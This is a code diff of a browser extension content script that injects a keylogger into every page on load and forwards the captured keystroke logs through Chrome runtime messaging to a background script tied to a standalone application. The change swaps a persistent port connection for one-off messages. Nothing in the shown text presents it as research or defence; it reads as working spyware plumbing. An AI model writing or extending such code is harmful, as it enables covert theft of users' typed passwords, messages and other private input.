@@ -28,45 +28,20 @@ function injectKeylogger() {
 // Insert keylogger at each document onload event
 document.onload = injectKeylogger();
 
-// creating the connection to the external app. The connection
-// will be recreated each time an event is fired. Before re-initialize connection
-// the event will try to understand if connection already exists
-var port = null;
-
-function connectExternalApp(msg) {
-    if (!port) { 
-        port = chrome.runtime.connect(__appID.app);
-        port.postMessage({
-           protocol: "log",
-           content: "[" + __time() + " :: EXT] Establishing Connection. If you see this message the connection is established :: " + (msg ? msg : "not_defined")
-        });
-        // null the port when connection disconnects
-        port.onDisconnect.addListener(function() {
-            port = null;
-        });
-    }
-}
-
-// Event listener. This event listener will send message to app using
-// chrome.runtime.port message passing architecture
+// // Event listener. This event listener will send message to app using
+// // chrome.runtime to pass it to the background of the page
 document.addEventListener(__config.dispatchID, function(e) {
-    
     // keylog is an abject that contains all the logging informations
-    // passed from the injected script
+    // passed from the injected script to the injecter script
     keylog = e.detail;
     
-    connectExternalApp("event");
-    port.postMessage({
-        protocol: "event",
+    // Now we have to pass all those informations to the background script that has an interface with 
+    // the standalone application
+    chrome.runtime.sendMessage({ 
+        protocol: "report_event",
         content: keylog
-    })
+    });
     
 });
 
-chrome.runtime.onMessage.addListener( function(msg) {
-    if (msg.protocol === "show") {
-        connectExternalApp("show");
-        port.postMessage(msg);
-    }
-})
 
